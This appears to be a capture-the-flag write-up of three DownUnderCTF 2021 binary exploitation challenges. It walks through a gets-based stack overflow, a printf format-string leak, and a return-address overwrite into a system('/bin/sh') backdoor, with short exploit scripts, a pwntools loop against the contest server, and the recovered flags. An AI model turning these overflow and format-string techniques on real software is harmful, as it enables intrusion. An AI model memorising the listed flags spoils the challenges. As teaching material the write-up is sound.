# Challenge name: deadcode

### Description
I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.

## Decompiled code
![image](https://user-images.githubusercontent.com/69805864/134916543-67ad3df0-1710-473c-a6bc-d1e7dfb5824f.png)

### Methodology
From the code, we can see that `v5` is set to 0 but in line 11 it check `if v5 == 3735929054`, user's input is `v4` and the program use `gets` which is not check the input. So this challenge is a stackoverflow challenge.

## Exploit

![image](https://user-images.githubusercontent.com/69805864/134918553-62e3748f-ebe1-44e5-876e-73b323f08593.png)
 Via the assembly code above, we have a stack like this:
 
 ![image](https://user-images.githubusercontent.com/69805864/134919113-6398147e-1f48-48b9-9f80-7a02a17d0a72.png)

So our input should be have first 24 bytes for padding and last 8 bytes to override `v5` which is `\xde\xc0\xad\xde\x00\x00\x00\x00` because linux use little endian.

### Exploit code

```
exploit = "0"*24
exploit += "\xde\xc0\xad\xde\x00\x00\x00\x00"
print(exploit)
print("cat flag.txt")
```

Run the code and we wil get the flag
![image](https://user-images.githubusercontent.com/69805864/134920984-789b16d3-e0f5-4ec5-8af0-9a1decd12873.png)

## Flag
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}



# ==========================================================================================

# Challenge name: Leaking like a sieve

### Description
This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?

## Decompiled code
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+8h] [rbp-58h]
  char format[32]; // [rsp+10h] [rbp-50h] BYREF
  char s[40]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  buffer_init(argc, argv, envp);
  stream = fopen("./flag.txt", "r");
  if ( !stream )
  {
    puts("The flag file isn't loading. Please contact an organiser if you are running this on the shell server.");
    exit(0);
  }
  fgets(s, 32, stream);
  while ( 1 )
  {
    puts("What is your name?");
    fgets(format, 32, stdin);
    printf("\nHello there, ");
    printf(format);
    putchar(10);
  }
}
```

### Methodology
As we can see from the code above, the progam load flag and save it to `s`, our input is saved to `format` and use `printf` to print it `printf(format)`. So this is a format string challenge.

## Exploit

Enter `%x` and we see that it print hex value which is the value in stack

![image](https://user-images.githubusercontent.com/69805864/134924126-ff42a592-4d14-40ab-ae5a-26ff0ff2527c.png)

Because we don't know where the flag store in stack, we brute force it by using `%(offset)$s` to print value in stack

```
from pwn import *

for i in range(100):
  try:
    sh = remote('pwn-2021.duc.tf', 31918)
    sh.sendlineafter('What is your name?\n', '%{}$s'.format(i))
    print (sh.recvline())
    print (i, sh.recvline())
    sh.close()
  except EOFError:
    pass
```

In the 6th iteration it print the flag

![image](https://user-images.githubusercontent.com/69805864/134925404-4ba56e8a-b232-4d76-9b61-724ac78cb96a.png)

## Flag
DUCTF{f0rm4t_5p3c1f13r_m3dsg!}


# ==========================================================================================

# Challenge name: outBackdoor

### Description
Fool me once, shame on you. Fool me twice, shame on me.

## Decompiled code


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  buffer_init(argc, argv, envp);
  puts("\nFool me once, shame on you. Fool me twice, shame on me.");
  puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
  gets(v4);
  return 0;
}
```


### Methodology
According the code above our input is `v4` and use `gets` which doesn't check lenght of the input. So this maybe a stackoverflow challenge again. There is nothing more in main fuction. Let's take a look at function window in IDA

![image](https://user-images.githubusercontent.com/69805864/134927255-56ab6e7e-cf8a-41a7-820b-46b661e79fc2.png)

We found that there is a suspicious function name `outBackdoor`.

```
int outBackdoor()
{
  puts("\n\nW...w...Wait? Who put this backdoor out back here?");
  return system("/bin/sh");
}
````

The function return `system("/bin/sh")` where could be store `flag.txt`. We have to override the return address of the stack to redirect to the return of `outBackdoor` function.

## Exploit

![image](https://user-images.githubusercontent.com/69805864/134929385-765407b7-901b-478e-bc93-ff47b8ee34c8.png)

Via the assembly code we have stack like this:

![image](https://user-images.githubusercontent.com/69805864/134929835-f55f8abd-6708-4763-bf09-f6d0555e5bab.png)

So our input should be have 24 bytes to padding and 8 bytes to override the return address replaced with address of the return of `outBackdoor` function which is `\xe7\x11\x40\x00\x00\x00\x00\x00`.

![image](https://user-images.githubusercontent.com/69805864/134930477-6ed3f570-1942-49a7-9237-9b3da56c34e4.png)

### Exploit code

```
exploit = "0"*24
exploit += '\xe7\x11\x40\x00\x00\x00\x00\x00'
print(exploit)
print("cat flag.txt")

```
Run the code and we will get the flag.

![image](https://user-images.githubusercontent.com/69805864/134930875-35fa11cd-cc96-4005-8655-6d6106a8d46b.png)

## Flag
DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}
